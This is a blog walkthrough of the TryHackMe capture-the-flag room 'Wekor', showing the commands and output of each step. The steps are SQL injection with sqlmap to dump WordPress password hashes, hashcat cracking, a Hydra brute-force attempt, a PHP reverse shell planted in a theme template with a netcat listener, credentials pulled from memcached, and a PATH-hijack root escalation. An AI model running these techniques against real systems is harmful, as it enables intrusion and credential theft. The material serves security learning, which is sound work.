---
layout: post
title: TryHackMe Walkthrough - Wekor
date: 2021-06-27
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
- Machine
permalink: /2021/06/Wekor
img: 2021/06/Wekor/Wekor.jpeg
---

This was a very fun run. It took me a long time to do it. It required lots of enumeration, some SQL Injection, cracking passwords, understanding Memcache and abusing sudo.

* Room: Wekor
* Difficulty: Medium
* URL: [https://tryhackme.com/room/wekorra](https://tryhackme.com/room/wekorra)
* Author: [ustoun0](https://tryhackme.com/p/ustoun0)

```
CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;)


Hey Everyone! This Box is just a little CTF I've prepared recently. I hope you enjoy it as it is my first time ever creating something like this !

This CTF is focused primarily on enumeration, better understanding of services and thinking out of the box for some parts of this machine.

Feel free to ask any questions...It's okay to be confused in some parts of the box ;)

Just a quick note, Please use the domain : "wekor.thm" as it could be useful later on in the box ;)
```

## Enumeration
I started the room by running RustScan to enumerate the opened ports. Only ports 22 (SSH) and 80 (HTTP) where opened.

```bash
$ rustscan -a target -- -A -script vuln | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.80.43:22
Open 10.10.80.43:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
```

## Web Sites
### Main Site
I added wekor.thm to my hosts file as recommended in the room description.

```bash
$ cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.26.27             target target.thm
10.10.26.27             wekor.thm
```

Then I opened a browser and navigated to [http://wekor.thm/](http://wekor.thm/).

![Main Site](/assets/images/2021/06/Wekor/01_MainSite.png "Main Site")

The site is empty, with nothing hidden in the HTML or in headers. I launched Gobuster to look for hidden files and folders, but it did not find anything other than the robots.txt file.

I looked in the robots file, it contained a few entries.

```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

I tried them all. The only one that contained something was [/comingreallysoon](http://wekor.thm/comingreallysoon/). This was another page with only text. But this one sent me to another page.

```
Welcome Dear Client!

We've setup our latest website on /it-next, Please go check it out!

If you have any comments or suggestions, please tweet them to @faketwitteraccount!

Thanks a lot !
```

### it.next

The site at [/it-next](http://wekor.thm/it-next/) had a lot more content.

![it.next](/assets/images/2021/06/Wekor/02_ITNext.png "it.next")

I looked through the site a few times, but it did not appear to do anything. I tried all the forms I saw for SQL Injection, but no luck there. 

I ran Gobuster in the folder, but again nothing was found.

### Wordpress

I was not finding anything on the pages I had access to. So I tried scanning for subdomains with wfuzz.

```bash
$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 3 -H "Host:FUZZ.wekor.thm" "http://wekor.thm/"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://wekor.thm/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000382:   200        5 L      29 W       143 Ch      "site"
000002700:   400        12 L     53 W       422 Ch      "m."
000002795:   400        12 L     53 W       422 Ch      "ns2.cl.bellsouth.net."
000002885:   400        12 L     53 W       422 Ch      "ns2.viviotech.net."
000002883:   400        12 L     53 W       422 Ch      "ns1.viviotech.net."
000003050:   400        12 L     53 W       422 Ch      "ns3.cl.bellsouth.net."
000004083:   400        12 L     53 W       422 Ch      "quatro.oweb.com."
000004082:   400        12 L     53 W       422 Ch      "jordan.fortwayne.com."
000004081:   400        12 L     53 W       422 Ch      "ferrari.fortwayne.com."

Total time: 47.80995
Processed Requests: 5000
Filtered Requests: 4991
Requests/sec.: 104.5807
```

It found a subdomain on site. I reopened my hosts file and added site.wekor.thm to it. Then I opened it in my browser. It was another page with only text on it. 

```
Hi there! Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS! - Jim
```

I launched Gobuster another time. This time, it found something interesting. 

```bash
$ gobuster dir -e -u http://site.wekor.thm/ -xphp,txt -t30 -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://site.wekor.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/27 07:02:40 Starting gobuster in directory enumeration mode
===============================================================
http://site.wekor.thm/.htpasswd.php        (Status: 403) [Size: 279]
http://site.wekor.thm/.htpasswd.txt        (Status: 403) [Size: 279]
http://site.wekor.thm/.htpasswd            (Status: 403) [Size: 279]
http://site.wekor.thm/.hta                 (Status: 403) [Size: 279]
http://site.wekor.thm/.htaccess            (Status: 403) [Size: 279]
http://site.wekor.thm/.hta.php             (Status: 403) [Size: 279]
http://site.wekor.thm/.htaccess.php        (Status: 403) [Size: 279]
http://site.wekor.thm/.hta.txt             (Status: 403) [Size: 279]
http://site.wekor.thm/.htaccess.txt        (Status: 403) [Size: 279]
http://site.wekor.thm/index.html           (Status: 200) [Size: 143]
http://site.wekor.thm/server-status        (Status: 403) [Size: 279]
http://site.wekor.thm/wordpress            (Status: 301) [Size: 320] [--> http://site.wekor.thm/wordpress/]

===============================================================
2021/06/27 07:04:34 Finished
===============================================================
```

There is a [/wordpress/](http://site.wekor.thm/wordpress/) folder. 

![Wordpress](/assets/images/2021/06/Wekor/03_Wordpress.png "Wordpress")

A simple Wordpress site. I used WPScan to look for plugins and users. 

```bash
$ wpscan --url http://site.wekor.thm/wordpress/ -e ap,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://site.wekor.thm/wordpress/ [10.10.8.115]
[+] Started: Sun Jun 27 07:07:23 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://site.wekor.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://site.wekor.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://site.wekor.thm/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://site.wekor.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://site.wekor.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
 |  - http://site.wekor.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2021-04-27T00:00:00.000Z
 | Readme: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jun 27 07:07:38 2021
[+] Requests Done: 54
[+] Cached Requests: 6
[+] Data Sent: 14.766 KB
[+] Data Received: 395.89 KB
[+] Memory used: 201.492 MB
[+] Elapsed time: 00:00:15

```

It did not find any plugins, but there was a user called admin. I also scanned for plugins with nmap. It sometime finds plugins that WPScan missed. But nothing there also.

```bash
$ nmap -sV --script http-wordpress-enum --script-args search-limit=10000,http-wordpress-enum.root=/wordpress/ -p 80 site.wekor.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 07:21 EDT
Nmap scan report for site.wekor.thm (10.10.8.115)
Host is up (0.24s latency).
rDNS record for 10.10.8.115: target

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-wordpress-enum:
| Search limited to top 10000 themes/plugins
|   themes
|     twentyseventeen 2.5
|   plugins
|_    akismet 4.1.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.91 seconds
```

Next, I tried to brute force the admin password with Hydra. 

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -u -f -t64 -m '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:S=Location' wekor.thm http-post-form -v -e snr
```

This ran for hours without finding anything. At this point I was stuck, so I went back to take one more look at the sites I found before. 


### it.next - Again

I took a second look at the it.next site. The room description mention SQL Injection, so I looked closer to any fields in the pages. I had already tried it on the search form. But on my first pass, I had missed the coupon field in the [Cart](http://wekor.thm/it-next/it_cart.php).

![Coupon](/assets/images/2021/06/Wekor/04_InvalidCoupon.png "Coupon")

I tried the basic `' or 1 = 1 -- -` and it worked on the first try. 

![SQLi](/assets/images/2021/06/Wekor/05_SQLInjection.png "SQLi")

Now I knew where to get the admin password. If I could dump the database, I would probably get the admin password.

I started sqlmap to exploit the SQL Injection. 

```bash
$ sqlmap -u http://wekor.thm/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not r
esponsible for any misuse or damage caused by this program

[*] starting @ 11:24:56 /2021-06-27/

[11:24:56] [INFO] testing connection to the target URL
[11:24:57] [INFO] searching for forms
[11:24:58] [INFO] found a total of 3 targets
[#1] form:
POST http://wekor.thm/it-next/it_cart.php
POST data: coupon_code=&apply_coupon=Apply%20Coupon
do you want to test this form? [Y/n/q]

Edit POST data [default: coupon_code=&apply_coupon=Apply%20Coupon] (Warning: blank fields detected):
do you want to fill blank fields with random values? [Y/n]
[11:25:04] [INFO] resuming back-end DBMS 'mysql'
[11:25:04] [INFO] using '/home/ehogue/.local/share/sqlmap/output/results-06272021_1125am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: coupon_code (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: coupon_code=uCZV' OR NOT 7049=7049#&apply_coupon=Apply Coupon

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=uCZV' AND GTID_SUBSET(CONCAT(0x7176766a71,(SELECT (ELT(9092=9092,1))),0x7171627671),9092)-- OXgy&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=uCZV' AND (SELECT 5536 FROM (SELECT(SLEEP(5)))FMUI)-- GUMI&apply_coupon=Apply Coupon

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: coupon_code=uCZV' UNION ALL SELECT CONCAT(0x7176766a71,0x585a72484754755164615677574e484e6f4a574e41635169695252614d746d414e6a55484f4d6b68,0x7171627671),NULL,NULL#&apply_coupon=Apply Coupon
---
do you want to exploit this SQL injection? [Y/n]
[11:25:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[11:25:06] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:25:06] [INFO] fetching current database
[11:25:07] [INFO] fetching tables for database: 'coupons'
[11:25:08] [INFO] fetching columns for table 'valid_coupons' in database 'coupons'
[11:25:09] [INFO] fetching entries for table 'valid_coupons' in database 'coupons'
Database: coupons
Table: valid_coupons
[1 entry]
+----+--------+---------------+
| id | coupon | expire_date   |
+----+--------+---------------+
| 1  | 12345  | doesnotexpire |
+----+--------+---------------+

[11:25:09] [INFO] table 'coupons.valid_coupons' dumped to CSV file '/home/ehogue/.local/share/sqlmap/output/wekor.thm/dump/coupons/valid_coupons.csv'
SQL injection vulnerability has already been detected against 'wekor.thm'. Do you want to skip further tests involving it? [Y/n]
[11:25:25] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php?s='
[11:25:25] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php'
[11:25:25] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/ehogue/.local/share/sqlmap/output/results-06272021_1125am.csv'

[*] ending @ 11:25:25 /2021-06-27/
```

The database used by the site has only one table, and I already knew that coupon. I next looked for other databases. 

```bash
$ sqlmap -u http://wekor.thm/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --schema

...
Database: wordpress
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+

Database: wordpress
Table: wp_terms
[4 columns]
+------------+---------------------+
| Column     | Type                |
+------------+---------------------+
| name       | varchar(200)        |
| slug       | varchar(200)        |
| term_group | bigint(10)          |
| term_id    | bigint(20) unsigned |
+------------+---------------------+

...

```

### Wordpress - Again

There is a wordpress database that contains the habitual Wordpress tables. So I dumped the wp_users table. This is the one that contains the passwords.

```bash
sqlmap -u http://wekor.thm/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" -D wordpress -T wp_users --dump
...

Database: wordpress
Table: wp_users
[4 entries]
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | 1624795046:$P$BiqkI23.U1PxXdXI1bEOM98yW.954h1 |
| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |
| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
```

There was four users in the table. I used hashcat to crack their passwords.

```bash
ehogue@kali:~/Kali/OnlineCTFs/TryHackMe/Wekor$ hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
... 

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10:REDACTED
$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/:REDACTED
$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:REDACTED
```

It failed to crack the password for admin, but got it for the other three users. I connected to the site with their credentials. The user wp_yura was admin in the site. 

Getting a shell when you have an admin account on Wordpress is very easy. Admins in Wordpress have access to the Theme Editor. This allow them to modify how the site looks. Many files that are editable are PHP files. So admins can run any code they want on a Wordpress site. They just need to modify a PHP file, save it, and navigate to a page that include that file. 

I usually inject my code in the [404 template]( http://site.wekor.thm/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone). 

![404 Template](/assets/images/2021/06/Wekor/06_themeEditor.png "404 Template")

I inject the PHP reverse shell that is found in `/usr/share/webshells/php/php-reverse-shell.php` in Kali. Then I can navigate to a [page that does not exists](http://site.wekor.thm/wordpress/index.php/category/uncategorized/) to get my reverse shell. 

```php
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.8.115 44812
Linux osboxes 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021 i686 i686 i686 GNU/Linux
 11:48:24 up  4:59,  0 users,  load average: 0.02, 0.01, 0.75
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

## Escalation To Orka

I had a shell, but only as www-data. So I needed to get access to a real user. But first, I solidified my shell to get auto completion and avoid disconnection if I hit CTRL-c.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL-z
stty raw -echo;fg
```

I then started looking around the server. I found two config file that contained the database password. I already had all I needed from the DB, but I tried that password for the user and root. I failed.

```bash
$ cat /var/www/html/it-next/config.php
...
define("DB_SERVER","localhost");
define("DB_USERNAME" , "root");
define("DB_PASSWORD", "REDACTED");
define("DB_DATABASE", "coupons");
...
```

```bash
$ cat /var/www/html/site.wekor.thm/wordpress/wp-config.php
...
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'root' );
/** MySQL database password */
define( 'DB_PASSWORD', 'REDACTED' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
...
```

I then looked at the passwd file. 
```bash
www-data@osboxes:/$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
...

Orka:x:1001:1001::/home/Orka:/bin/bash
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
memcache:x:123:130:Memcached,,,:/nonexistent:/bin/false
```

The server had memcache running.
```bash
www-data@osboxes:/$ ps aux | grep memca
ps aux | grep memca
memcache   963  0.0  0.3  47724  3372 ?        Ssl  13:59   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
www-data  1733  0.0  0.0   3036   788 pts/8    S+   14:06   0:00 grep memca
```

I looked for ways to get the data out of memcache and found [an interesting article about it](https://www.hackingarticles.in/penetration-testing-on-memcached-server/).

```
www-data@osboxes:/$ telnet localhost 11211
telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

version
VERSION 1.4.25 Ubuntu

stats
STAT pid 963
STAT uptime 549
STAT time 1624817301
STAT version 1.4.25 Ubuntu
STAT libevent 2.0.21-stable
STAT pointer_size 32
STAT rusage_user 0.012290
STAT rusage_system 0.012290
STAT curr_connections 1
STAT total_connections 12
....

stats slabs
STAT 1:chunk_size 80
STAT 1:chunks_per_page 13107
STAT 1:total_pages 1
STAT 1:total_chunks 13107
STAT 1:used_chunks 5
STAT 1:free_chunks 13102
STAT 1:free_chunks_end 0
STAT 1:mem_requested 321
STAT 1:get_hits 0
STAT 1:cmd_set 50
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048560
END


stats cachedump 1 0
ITEM id [4 b; 1624816692 s]
ITEM email [14 b; 1624816692 s]
ITEM salary [8 b; 1624816692 s]
ITEM password [15 b; 1624816692 s]
ITEM username [4 b; 1624816692 s]
END

get id
VALUE id 0 4
3476
END

get email
VALUE email 0 14
Orka@wekor.thm
END

get salary
VALUE salary 0 8
$100,000
END

get username
VALUE username 0 4
Orka
END

get password
VALUE password 0 15
REDACTED
END
```

The memcache server contained a password for the user Orka. I tried it with su and it was the correct password. I had my user, and the first flag. 

```bash
www-data@osboxes:/$ su Orka
Password: 

Orka@osboxes:~$ cd

Orka@osboxes:~$ cat user.txt
REDACTED
```

## Getting root

Once connected as a user, I then needed to get root. I checked for sudo permissions. 

```bash
Orka@osboxes:~$ sudo -l
[sudo] password for Orka:
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin


Orka@osboxes:~$ ls -la Desktop/bitcoin
-rwxr-xr-x 1 root root 7696 Jan 23 15:23 Desktop/bitcoin

Orka@osboxes:~$ file Desktop/bitcoin
Desktop/bitcoin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped
```

I was allowed to run one command as root. I was not allowed to write to the file, nor the folder that contained it. 

When I ran the command, it asked for a password. I ran `strings`, but failed to see the password. 

```bash
Orka@osboxes:~$ strings Desktop/bitcoin | less
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
gets
sprintf
__isoc99_scanf
puts
__stack_chk_fail
__ctype_b_loc
system
sleep
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.3
GLIBC_2.7
GLIBC_2.4
```

I downloaded the file to my machine and looked at it in Ghidra. 
![Bitcoins Code](/assets/images/2021/06/Wekor/07_BitcoinsCode.png "Bitcoins Code")

The password was in the code, so I could run the program.

```bash
Orka@osboxes:~$ sudo Desktop/bitcoin 
Enter the password : 
Access Granted...
                        User Manual:
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 1
Saving 1 BitCoin(s) For Later Use 
Do you want to make a transfer? Y/N : Y
Transfering 1 BitCoin(s) 
Transfer Completed Successfully...
```

Looking at the code, it request the number of Bitcoins to transfer, then call a python script to perform the transfer. 

```bash
$ ls -la Desktop/transfer.py 
-rwxr--r-- 1 root root 588 Jan 23 14:27 Desktop/transfer.py
```

The python script is also protected so I could not change it. I tried creating a python executable that would run bash. But sudo was configured to block me from changing the PATH. I also tried to create local module for python imports, but that also failed. 

I next looked at the secure_path to see if I could write in any folders it uses. 

```bash
Orka@osboxes:~$ sudo -l
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin

Orka@osboxes:~$ ls -ld /usr/local/sbin/
drwxr-xr-x 2 root root 4096 Feb 26  2019 /usr/local/sbin/

Orka@osboxes:~$ ls -ld /usr/local/bin
drwxr-xr-x 2 root root 4096 Jan 23 15:19 /usr/local/bin

Orka@osboxes:~$ ls -ld /usr/sbin/
drwxrwxr-x 2 root Orka 12288 Jan 23 16:01 /usr/sbin/

Orka@osboxes:~$ which python
/usr/bin/python
```

The folder `/usr/sbin` was writable. So if I added an executable file called python in there, it will be executed instead of the real python executable.


```bash
Orka@osboxes:~$ cat /usr/sbin/python
#!/bin/bash
/bin/bash -p
Orka@osboxes:~$ chmod +x /usr/sbin/python
```

With this in place, I could run the bitcoin program again and get my root shell.
```bash
Orka@osboxes:~$ sudo Desktop/bitcoin 
Enter the password : password
Access Granted...
                        User Manual:
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 1

root@osboxes:~# whoami
root

root@osboxes:~# cat /root/root.txt 
REDACTED
```

I took me a while to do this room. But I really had fun. In the description, ustoun0 say it's the first time they did something like this. I looked at their profile and they now have other room. I'm really looking forward to trying them. 
